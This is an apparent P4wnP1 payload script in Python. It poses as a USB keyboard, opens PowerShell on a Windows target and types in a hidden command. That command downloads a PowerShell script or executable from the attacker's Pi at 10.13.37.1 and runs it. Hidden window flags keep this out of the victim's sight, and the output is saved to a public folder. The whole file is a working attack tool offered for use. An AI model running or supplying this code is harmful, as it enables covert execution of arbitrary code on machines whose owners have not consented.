#!/usr/bin/env python3
# Fetch a user-supplied tool (EXE/PS1) from your Pi and run it; save stdout/stderr to a file.
import os, sys, time
P4WN_HOME = os.environ.get("P4WN_HOME", "/opt/p4wnp1")
sys.path.insert(0, os.path.join(P4WN_HOME, "tools"))
from hid_type import win_r, type_string

URL     = os.getenv("P4WN_TOOL_URL", "http://10.13.37.1/payloads/www/private/tool.ps1")
ARGS    = os.getenv("P4WN_TOOL_ARGS", "")
OUTPATH = os.getenv("P4WN_TOOL_OUT",  r"C:\Users\Public\p4w_out.txt")

def ps(cmd): return cmd.replace('"','""')

def main():
    win_r(); time.sleep(0.5)
    type_string("powershell\n"); time.sleep(0.8)
    cmd = (
      f"$u='{URL}';$o='{OUTPATH}';"
      f"try{{"
      f"$c=New-Object Net.WebClient;"
      f"$tmp=[IO.Path]::GetTempFileName();"
      f"$c.DownloadFile($u,$tmp);"
      f"if($u.ToLower().EndsWith('.ps1')){{"
      f"  $out=(powershell -nop -w hidden -File $tmp {ARGS}) 2>&1 | Out-String;"
      f"}}else{{"
      f"  $p=Start-Process -FilePath $tmp -ArgumentList '{ARGS}' -WindowStyle Hidden -PassThru -Wait -RedirectStandardOutput $o -RedirectStandardError $o;"
      f"  $out=(Get-Content -Raw $o);"
      f"}}"
      f"$out | Out-File -Encoding utf8 -FilePath $o; "
      f"Write-Host 'OK';"
      f"}}catch{{'ERR:'+$_.Exception.Message | Out-File -Encoding utf8 -FilePath $o}}"
    )
    type_string(f"powershell -nop -w hidden -c \"{ps(cmd)}\"\n")
    print("[*] Launched tool; output should be on target at", OUTPATH)
    return 0

if __name__ == "__main__":
    sys.exit(main())
